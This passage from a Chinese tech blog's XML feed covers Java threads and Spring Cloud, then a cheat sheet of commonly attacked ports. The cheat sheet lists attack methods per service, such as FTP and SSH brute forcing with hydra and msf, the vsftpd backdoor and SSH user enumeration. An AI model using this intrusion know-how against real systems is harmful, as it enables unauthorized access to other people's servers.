class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">public class MyThread implements Runnable</span><br><span class="line"></span><br><span class="line">　　&#123;</span><br><span class="line"></span><br><span class="line">　　　int count= 1, number;</span><br><span class="line"></span><br><span class="line">　　　public MyThread(int num)</span><br><span class="line"></span><br><span class="line">　　　&#123;</span><br><span class="line"></span><br><span class="line">　　　　number = num;</span><br><span class="line"></span><br><span class="line">　　　　System.out.println(&quot;创建线程 &quot; + number);</span><br><span class="line"></span><br><span class="line">　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　public void run()</span><br><span class="line"></span><br><span class="line">　　　&#123;</span><br><span class="line"></span><br><span class="line">　　　　while(true)</span><br><span class="line"></span><br><span class="line">　　　　&#123;</span><br><span class="line"></span><br><span class="line">　　　　　System.out.println</span><br><span class="line"></span><br><span class="line">　　　　　(&quot;线程 &quot; + number + &quot;:计数 &quot; + count);</span><br><span class="line"></span><br><span class="line">　　　　　if(++count== 6) return;</span><br><span class="line"></span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　public static void main(String args[])</span><br><span class="line"></span><br><span class="line">　　　&#123;</span><br><span class="line"></span><br><span class="line">　　　　for(int i = 0; i 〈 5;i++) new Thread(new MyThread(i+1)).start();</span><br><span class="line"></span><br><span class="line">　　　&#125;</span><br><span class="line"></span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p>严格地说，创建Thread子类的实例也是可行的，但是必须注意的是，该子类必须没有覆盖 Thread 类的 run 方法，否则该线程执行的将是子类的 run 方法，而不是我们用以实现Runnable 接口的类的 run 方法，对此大家不妨试验一下。</p><p>使用 Runnable 接口来实现多线程使得我们能够在一个类中包容所有的代码，有利于封装，它的缺点在于，我们只能使用一套代码，若想创建多个线程并使各个线程执行不同的代码，则仍必须额外创建类，如果这样的话，在大多数情况下也许还不如直接用多个类分别继承 Thread 来得紧凑。</p><p>综上所述，两种方法各有千秋，大家可以灵活运用。</p><p>下面让我们一起来研究一下多线程使用中的一些问题。</p><h3 id="二、线程的四种状态"><a href="#二、线程的四种状态" class="headerlink" title="二、线程的四种状态"></a>二、线程的四种状态</h3><p>\1. 新状态：线程已被创建但尚未执行（start() 尚未被调用）。</p><p>\2. 可执行状态：线程可以执行，虽然不一定正在执行。CPU <a href="http://www.liuhaihua.cn/archives/tag/%e6%97%b6%e9%97%b4" target="_blank" rel="noopener">时间</a>随时可能被分配给该线程，从而使得它执行。</p><p>\3. 死亡状态：正常情况下 run() 返回使得线程死亡。调用 stop()或 destroy() 亦有同样效果，但是不被推荐，前者会产生异常，后者是强制终止，不会释放<a href="http://www.liuhaihua.cn/archives/tag/%e9%94%81" target="_blank" rel="noopener">锁</a>。</p><p>\4. 阻塞状态：线程不会被分配 CPU 时间，无法执行。</p><h3 id="三、线程的优先级"><a href="#三、线程的优先级" class="headerlink" title="三、线程的优先级"></a>三、线程的优先级</h3><p>线程的优先级代表该线程的重要程度，当有多个线程同时处于可执行状态并等待获得 CPU 时间时，线程调度系统根据各个线程的优先级来决定给谁分配 CPU 时间，优先级高的线程有更大的机会获得 CPU 时间，优先级低的线程也不是没有机会，只是机会要小一些罢了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、在java中怎样实现多线程？&quot;&gt;&lt;a href=&quot;#一、在java中怎样实现多线程？&quot; class=&quot;headerlink&quot; title=&quot;一、在java中怎样实现多线程？&quot;&gt;&lt;/a&gt;一、在&lt;a href=&quot;http://www.liuhaihua.cn/archives/tag/java-2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;java&lt;/a&gt;中怎样实现&lt;a href=&quot;http://www.liuhaihua.cn/archives/tag/%e5%a4%9a%e7%ba%bf%e7%a8%8b&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;多线程&lt;/a&gt;？&lt;/h2&gt;&lt;p&gt;extends Thread&lt;/p&gt;
&lt;p&gt;implement Runnable&lt;/p&gt;
&lt;p&gt;方法一：继承 Thread 类，覆盖方法 run()，我们在创建的 Thread 类的子类中重写 run() ,加入&lt;a href=&quot;http://www.liuhaihua.cn/archives/tag/%e7%ba%bf%e7%a8%8b&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;线程&lt;/a&gt;所要执行的&lt;a href=&quot;http://www.liuhaihua.cn/archives/tag/%e4%bb%a3%e7%a0%81&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;代码&lt;/a&gt;即可。&lt;/p&gt;
&lt;p&gt;下面是一个例子：&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="https://www.5658.pw/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.5658.pw/tags/Java/"/>
    
      <category term="多线程" scheme="https://www.5658.pw/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>SpringCloud初步介绍</title>
    <link href="https://www.5658.pw/2019/01/23/SpringCloud%E5%88%9D%E6%AD%A5%E4%BB%8B%E7%BB%8D/"/>
    <id>https://www.5658.pw/2019/01/23/SpringCloud初步介绍/</id>
    <published>2019-01-23T10:04:03.000Z</published>
    <updated>2019-01-25T10:20:37.490Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="什么是微服务"><a href="#什么是微服务" class="headerlink" title="什么是微服务"></a>什么是微服务</h3><p>​    就目前而言，<strong>对于微服务业界并没有一个统一的、标准的定义</strong>。<br>　　但通常而言，微服务架构是一种架构模式或者说是一种架构风格，<strong>提倡将单一应用程序划分成一组小的服务</strong>，每个服务运行其独立的自己的 <strong>进程</strong> 中，服务之前相互协调、互相配合，为用户提供最终价值。服务之前采用轻量级的通信机制互相沟通(通常是基于HTTP的RestFul API)。每个服务都围绕着具体业务进行构建，并且能够独立地部署到生产环境，选择合适的语言，工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储。<br>　　从技术角度理解：微服务化的核心就是将传统的一站式应用，根据业务拆分成一个一个的服务，彻底地去耦合，每一个微服务提供单一业务功能的服务，一个服务做一件事，从技术角度看就是一种小而独立的处理过程，类似进程的概念，能够自行单独启动或销毁，拥有自己独立的数据库。<br><a id="more"></a><br>　　<a href="https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa" target="_blank" rel="noopener">论文网址</a></p><blockquote><p>说明：<br>　　spring Cloud 使用RESTful API 实现服务之间通信<br>　　dubbo 使用RPC 实现服务之间通信</p></blockquote><h2 id="微服务与微服务构架"><a href="#微服务与微服务构架" class="headerlink" title="微服务与微服务构架"></a>微服务与微服务构架</h2><h3 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h3><p>　　<strong>强调的是服务的大小</strong>，它关注的是某一个点，是具体解决某一个问题/提供落地对应服务的一个服务应用。<br>　　狭义的看，可以看作是要个项目里面的一个个微服务工作/Module 　　</p><h3 id="微服务构架"><a href="#微服务构架" class="headerlink" title="微服务构架"></a>微服务构架</h3><p>　　微服务构架 <strong>是一种架构模式</strong>，它提倡将单一应用程序划分成一组小的服务，服务之间互相协调，互相配合，为用户提供最终价值。每个服务运行在其 <strong>独立的进程中</strong>，服务与服务间采用轻量级的通信机制互相协作(通常是基于HTTP协议的RestFul API)。每个服务都围绕着具体业务进行构建，并且能够被独立的部署到生产环境、类生产环境等。另外，<strong>应当尽量避免统一的、集中式的服务管理机制</strong>，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构建。</p><hr><h2 id="微服务优缺点"><a href="#微服务优缺点" class="headerlink" title="微服务优缺点"></a>微服务优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>　　1).每个服务足够内聚，足够小，代码容易理解这样能聚焦一个指定的业务功能或业务需求。<br>　　2).开发简单，开发效率提高，一个服务可能就是专一的只干一件事。<br>　　3).微服务能够被小团队开发，这个团队可以是2到5个开发人员组成。<br>　　4).微服务是松耦合的，是有功能意义的服务，无论是在开发阶段或部署阶段都是独立的。<br>　　5).微服务能使用不同的语言开发。<br>　　6).易于第三方集成，微服务允许容易且灵活的方式集成自动部署，通过持续集成集成工具，如Jenkins、Hudson等。<br>　　7).微服务易于被一个开发人员理解，修改和维护，这样小团队能够更关注自己的工作成果。无需通过合作体现价值。<br>　　8).微服务允许你融合最新技术。<br>　　9).<strong>微服务只是业务逻辑代码，不会和HTML和CSS其他界面组件混合</strong>。<br>　　10).<strong>每个微服务都有自己的存储能力，可以有自己的数据库，也可以由统一的数据库</strong>。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>　　1).开发人员要处理分布式系统的复杂性<br>　　2).多服务运维难度，随着服务的增加，运维的压力也在增大<br>　　3).系统部署依赖<br>　　4).服务间通信成本<br>　　5).系统集成测试<br>　　6).性能监控<br>　　7).数据一致性。</p><hr><h2 id="微服务之间是如何独立通讯的？"><a href="#微服务之间是如何独立通讯的？" class="headerlink" title="微服务之间是如何独立通讯的？"></a>微服务之间是如何独立通讯的？</h2><hr><h2 id="微服务技术栈有哪些"><a href="#微服务技术栈有哪些" class="headerlink" title="微服务技术栈有哪些"></a>微服务技术栈有哪些</h2><table><thead><tr><th>微服务条目</th><th>落地的技术</th></tr></thead><tbody><tr><td>服务开发</td><td>SpringBoot、Spring、SpringMVC</td></tr><tr><td>服务配置管理</td><td>Netfilx公司的Archaius、阿里的Diamond等</td></tr><tr><td>服务注册与发现</td><td>Eureka、Consul、Zookeeper</td></tr><tr><td>服务调用</td><td>RPC、Rest、gRPC</td></tr><tr><td>服务熔断器</td><td>Hystrix、Envoy等</td></tr><tr><td>负载均衡</td><td>Nginx、Ribbon</td></tr><tr><td>服务接口调用</td><td>（客户端调用服务的简化工具） Feign等</td></tr><tr><td>消息队列</td><td>Kafka、RabbitMQ、ActiveMQ等</td></tr><tr><td>服务配置中心配置管理</td><td>SpringCloudConfig、Chef等</td></tr><tr><td>服务路由</td><td>（API网关） Zuul等</td></tr><tr><td>服务监控</td><td>Zabbix、Naggios、Metrics、Spectator等</td></tr><tr><td>全链路追踪</td><td>Zipkin、Brave、Dapper等</td></tr><tr><td>服务部署</td><td>Docker、OpenStack、Kubernetes等</td></tr><tr><td>数据流操作</td><td>发包 SpringCloud Stream</td></tr><tr><td>事件消息总线</td><td>Spring Cloud Bus</td></tr></tbody></table><hr><h2 id="SpringCloud是什么"><a href="#SpringCloud是什么" class="headerlink" title="SpringCloud是什么"></a>SpringCloud是什么</h2><p>官网说明：<br>　　SpringCloud，基于SpringBoot 提供的一套微服务解决方案，包括服务注册与发现，配置中心，全链路监控，服务网关，负载均衡，熔断器等组件，除了基于NetFlix的开源组件做高度抽象封装之外，还有一些选型中立的开源组件。<br>　　SpringCLoud利用SpringBoot的开发便利性巧妙的简化了分布式系统基础设施的开发，SpringCloud为开发人员提供了快速构建分布式系统的一些工具，<br><strong>包括配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等</strong>。它们都可以用SpringBoot的开发风格做到一键启动和部署。<br>　　<strong>Spring Boot -&gt; J2EE一站式解决方案</strong><br>　　<strong>Spring Cloud -&gt; 分布式整体解决方案</strong></p><hr><h2 id="为什么选择SpringCloud作为微服务架构"><a href="#为什么选择SpringCloud作为微服务架构" class="headerlink" title="为什么选择SpringCloud作为微服务架构"></a>为什么选择SpringCloud作为微服务架构</h2><p>1.选型依据<br>​　　1).整体解决方案和框架成熟度<br>​　　2).社区热度<br>​　　3).可维护度<br>​　　4).学习曲线</p><p>2.各微服务框架的对比</p><hr><h2 id="SpringBoot和SpringCloud！！"><a href="#SpringBoot和SpringCloud！！" class="headerlink" title="SpringBoot和SpringCloud！！"></a>SpringBoot和SpringCloud！！</h2><p>　　1).SpringBoot专注于快速方便的开发单个个体微服务。<br>　　2).SpringCloud是关注全局的微服务协调、整理、治理的框架，它将SpringBoot开发的单体整合并管理起来。<br>　　3).SpringBoot可以离开SpringCloud独立使用开发项目，但是 <strong>SpringCloud离不开SpringBoot</strong>，属于依赖关系。<br>　　<strong>SpringBoot专注于快速，方便的开发单个微服务个休，SpringCloud关注全局的服务治理框架</strong></p><hr><h2 id="springCloud和Dubbo！！！"><a href="#springCloud和Dubbo！！！" class="headerlink" title="springCloud和Dubbo！！！"></a>springCloud和Dubbo！！！</h2><table><thead><tr><th>Dubbo</th><th>SpringCloud</th><th></th></tr></thead><tbody><tr><td>服务注册中心</td><td>Zookeeper</td><td>Eureka</td></tr><tr><td>服务调用方式</td><td>RPC</td><td>REST API</td></tr><tr><td>服务监控</td><td>Dubbo-monitor</td><td>Spring BootAdmin</td></tr><tr><td>断路器</td><td>不完善</td><td>Spring Cloud Netflix Hystrix</td></tr><tr><td>服务网关</td><td>无</td><td>Spring Cloud Netflix Zuul</td></tr><tr><td>分布式配置</td><td>无</td><td>Spring Cloud Config</td></tr><tr><td>服务跟踪</td><td>无</td><td>Spring Cloud Sleuth</td></tr><tr><td>消息总线</td><td>无</td><td>Spring Cloud Bus</td></tr><tr><td>数据流</td><td>无</td><td>Spring Cloud Stream</td></tr><tr><td>批量任务</td><td>无</td><td>Spring Cloud Task</td></tr></tbody></table><p>　　目前成熟的互联网框架(分布式+服务治理Dubbo)<br>　　<strong>最大区别：SpringCloud抛弃了Dubbo的RPC通信，采用的是基于HTTP的REST方式。</strong><br>　　总体来说，两者各有优势。虽说后者服务调用的功能，但也避免了上面提到的原生RPC带来的问题。而且REST相比RPC更为灵活，服务提供方和调用方的依赖只依靠一纸契约，不存在代码级别的依赖，这在强调快速演化的微服务环境下，显得更加合适。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;什么是微服务&quot;&gt;&lt;a href=&quot;#什么是微服务&quot; class=&quot;headerlink&quot; title=&quot;什么是微服务&quot;&gt;&lt;/a&gt;什么是微服务&lt;/h3&gt;&lt;p&gt;​    就目前而言，&lt;strong&gt;对于微服务业界并没有一个统一的、标准的定义&lt;/strong&gt;。&lt;br&gt;　　但通常而言，微服务架构是一种架构模式或者说是一种架构风格，&lt;strong&gt;提倡将单一应用程序划分成一组小的服务&lt;/strong&gt;，每个服务运行其独立的自己的 &lt;strong&gt;进程&lt;/strong&gt; 中，服务之前相互协调、互相配合，为用户提供最终价值。服务之前采用轻量级的通信机制互相沟通(通常是基于HTTP的RestFul API)。每个服务都围绕着具体业务进行构建，并且能够独立地部署到生产环境，选择合适的语言，工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储。&lt;br&gt;　　从技术角度理解：微服务化的核心就是将传统的一站式应用，根据业务拆分成一个一个的服务，彻底地去耦合，每一个微服务提供单一业务功能的服务，一个服务做一件事，从技术角度看就是一种小而独立的处理过程，类似进程的概念，能够自行单独启动或销毁，拥有自己独立的数据库。&lt;br&gt;
    
    </summary>
    
      <category term="Java" scheme="https://www.5658.pw/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.5658.pw/tags/Java/"/>
    
      <category term="SpringCloud" scheme="https://www.5658.pw/tags/SpringCloud/"/>
    
      <category term="微服务" scheme="https://www.5658.pw/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>黑客常用端口利用总结</title>
    <link href="https://www.5658.pw/2019/01/11/%E9%BB%91%E5%AE%A2%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://www.5658.pw/2019/01/11/黑客常用端口利用总结/</id>
    <published>2019-01-11T04:55:05.000Z</published>
    <updated>2019-05-11T05:43:01.211Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><table><thead><tr><th style="text-align:center"><a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a></th><th style="text-align:center">服务</th><th style="text-align:center"><a href="https://www.nkymbk.cn/tag/入侵" target="_blank" rel="noopener">入侵</a>方式</th></tr></thead><tbody><tr><td style="text-align:center">21</td><td style="text-align:center">ftp/tftp/vsftpd文件传输协议</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/嗅探/溢出/<a href="https://www.nkymbk.cn/tag/后门" target="_blank" rel="noopener">后门</a></td></tr><tr><td style="text-align:center">22</td><td style="text-align:center">ssh远程连接</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/openssh<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a></td></tr><tr><td style="text-align:center">23</td><td style="text-align:center">Telnet远程连接</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/嗅探/弱口令</td></tr><tr><td style="text-align:center">25</td><td style="text-align:center">SMTP邮件服务</td><td style="text-align:center">邮件伪造</td></tr><tr><td style="text-align:center">53</td><td style="text-align:center">DNS<a href="https://www.nkymbk.cn/tag/域名" target="_blank" rel="noopener">域名</a>解析<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a></td><td style="text-align:center">域传送/<a href="https://www.nkymbk.cn/tag/劫持" target="_blank" rel="noopener">劫持</a>/缓存投毒/欺骗</td></tr><tr><td style="text-align:center">67/68</td><td style="text-align:center">dhcp服务</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/劫持" target="_blank" rel="noopener">劫持</a>/欺骗</td></tr><tr><td style="text-align:center">110</td><td style="text-align:center">pop3</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/嗅探</td></tr><tr><td style="text-align:center">139</td><td style="text-align:center">Samba服务</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/未授权访问/远程<a href="https://www.nkymbk.cn/tag/命令执行" target="_blank" rel="noopener">命令执行</a></td></tr><tr><td style="text-align:center">143</td><td style="text-align:center">Imap协议</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a></td></tr><tr><td style="text-align:center">161</td><td style="text-align:center">SNMP协议</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/搜集目标内网信息</td></tr><tr><td style="text-align:center">389</td><td style="text-align:center">Ldap目录访问协议</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>/未授权访问/弱口令</td></tr><tr><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/445" target="_blank" rel="noopener">445</a></td><td style="text-align:center">smb</td><td style="text-align:center">ms17-010/<a href="https://www.nkymbk.cn/tag/端口" target="_blank" rel="noopener">端口</a>溢出</td></tr><tr><td style="text-align:center">512/513/514</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/Linux" target="_blank" rel="noopener">Linux</a> Rexec服务</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/Rlogin登陆</td></tr><tr><td style="text-align:center">873</td><td style="text-align:center">Rsync服务</td><td style="text-align:center">文件上传/未授权访问</td></tr><tr><td style="text-align:center">1080</td><td style="text-align:center">socket</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a></td></tr><tr><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/135" target="_blank" rel="noopener">135</a>2</td><td style="text-align:center">Lotus domino邮件服务</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/信息泄漏</td></tr><tr><td style="text-align:center">1433</td><td style="text-align:center">mssql</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>/SA弱口令</td></tr><tr><td style="text-align:center">1521</td><td style="text-align:center">oracle</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>/TNS<a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/反弹shell</td></tr><tr><td style="text-align:center">2049</td><td style="text-align:center">Nfs服务</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/配置" target="_blank" rel="noopener">配置</a>不当</td></tr><tr><td style="text-align:center">2181</td><td style="text-align:center">zookeeper服务</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">2375</td><td style="text-align:center">docker remote api</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">3306</td><td style="text-align:center">mysql</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a></td></tr><tr><td style="text-align:center">3389</td><td style="text-align:center">Rdp远程桌面链接</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/shift<a href="https://www.nkymbk.cn/tag/后门" target="_blank" rel="noopener">后门</a></td></tr><tr><td style="text-align:center">4848</td><td style="text-align:center">GlassFish控制台</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/认证绕过</td></tr><tr><td style="text-align:center">5000</td><td style="text-align:center">sybase/DB2<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a></td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>/<a href="https://www.nkymbk.cn/tag/提权" target="_blank" rel="noopener">提权</a></td></tr><tr><td style="text-align:center">5432</td><td style="text-align:center">postgresql</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a>/缓冲区溢出</td></tr><tr><td style="text-align:center">5632</td><td style="text-align:center">pcanywhere服务</td><td style="text-align:center">抓<a href="https://www.nkymbk.cn/tag/密码" target="_blank" rel="noopener">密码</a>/<a href="https://www.nkymbk.cn/tag/代码执行" target="_blank" rel="noopener">代码执行</a></td></tr><tr><td style="text-align:center">5900</td><td style="text-align:center">vnc</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/认证绕过</td></tr><tr><td style="text-align:center">6379</td><td style="text-align:center">Redis<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a></td><td style="text-align:center">未授权访问/<a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a></td></tr><tr><td style="text-align:center">7001/7002</td><td style="text-align:center">weblogic</td><td style="text-align:center">java<a href="https://www.nkymbk.cn/tag/反序列化" target="_blank" rel="noopener">反序列化</a>/控制台弱口令</td></tr><tr><td style="text-align:center">80/443</td><td style="text-align:center">http/https</td><td style="text-align:center">web应用<a href="https://www.nkymbk.cn/tag/漏洞" target="_blank" rel="noopener">漏洞</a>/心脏滴血</td></tr><tr><td style="text-align:center">8069</td><td style="text-align:center">zabbix服务</td><td style="text-align:center">远程<a href="https://www.nkymbk.cn/tag/命令执行" target="_blank" rel="noopener">命令执行</a>/<a href="https://www.nkymbk.cn/tag/注入" target="_blank" rel="noopener">注入</a></td></tr><tr><td style="text-align:center">8161</td><td style="text-align:center">activemq</td><td style="text-align:center">弱口令/写文件</td></tr><tr><td style="text-align:center">8080/8089</td><td style="text-align:center">Jboss/<a href="https://www.nkymbk.cn/tag/Tomcat" target="_blank" rel="noopener">Tomcat</a>/Resin</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/PUT文件上传/<a href="https://www.nkymbk.cn/tag/反序列化" target="_blank" rel="noopener">反序列化</a></td></tr><tr><td style="text-align:center">8083/8086</td><td style="text-align:center">influxDB</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">9000</td><td style="text-align:center">fastcgi</td><td style="text-align:center">远程<a href="https://www.nkymbk.cn/tag/命令执行" target="_blank" rel="noopener">命令执行</a></td></tr><tr><td style="text-align:center">9090</td><td style="text-align:center">Websphere控制台</td><td style="text-align:center"><a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a>/java<a href="https://www.nkymbk.cn/tag/反序列化" target="_blank" rel="noopener">反序列化</a>/弱口令</td></tr><tr><td style="text-align:center">9200/9300</td><td style="text-align:center">elasticsearch</td><td style="text-align:center">远程<a href="https://www.nkymbk.cn/tag/代码执行" target="_blank" rel="noopener">代码执行</a></td></tr><tr><td style="text-align:center">11211</td><td style="text-align:center">memcached</td><td style="text-align:center">未授权访问</td></tr><tr><td style="text-align:center">27017/27018</td><td style="text-align:center">mongodb</td><td style="text-align:center">未授权访问/<a href="https://www.nkymbk.cn/tag/爆破" target="_blank" rel="noopener">爆破</a></td></tr></tbody></table><a id="more"></a><p>21端口渗透剖析**</p><p>FTP通常用作对远程<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>进行管理，典型应用就是对web<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>进行管理。一旦FTP<a href="https://www.nkymbk.cn/tag/密码" target="_blank" rel="noopener">密码</a><a href="https://www.nkymbk.cn/tag/泄露" target="_blank" rel="noopener">泄露</a>就直接威胁web<a href="https://www.nkymbk.cn/tag/系统" target="_blank" rel="noopener">系统</a>安全，甚至<a href="https://www.nkymbk.cn/tag/黑客" target="_blank" rel="noopener">黑客</a>通过<a href="https://www.nkymbk.cn/tag/提权" target="_blank" rel="noopener">提权</a>可以直接控制<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>。这里剖析<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>FTP<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>的几种<a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。``（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱``（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（https:``//www.freebuf.com/column/143480.html）``（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。``（5）ftp远程代码溢出。（https:``//blog.csdn.net/weixin_42214273/article/details/82892282）（6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）`</span><br></pre></td></tr></table></figure><p><strong>22端口渗透剖析</strong></p><p><a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>H 是协议，通常使用 Open<a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>H 软件实现协议应用。<a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>H 为 Secure <a href="https://www.nkymbk.cn/tag/Shell" target="_blank" rel="noopener">Shell</a> 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；<a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>H 为建立在应用层和传输层基础上的安全协议。<a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>H 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 <a href="https://www.nkymbk.cn/tag/SS" target="_blank" rel="noopener">SS</a>H 协议可以有效防止远程管理过程中的<a href="https://www.nkymbk.cn/tag/信息泄露" target="_blank" rel="noopener">信息泄露</a>问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。``（2）防火墙SSH后门。（https:``//www.secpulse.com/archives/6.093.html）``（3）28退格 OpenSSL``（4）openssh 用户枚举 CVE-2018-15473。（https:``//www.anquanke.com/post/id/157607）`</span><br></pre></td></tr></table></figure><p><strong>23端口渗透剖析</strong></p><p>telnet是一种旧的远程管理方式，使用telnet<a href="https://www.nkymbk.cn/tag/工具" target="_blank" rel="noopener">工具</a>登录<a 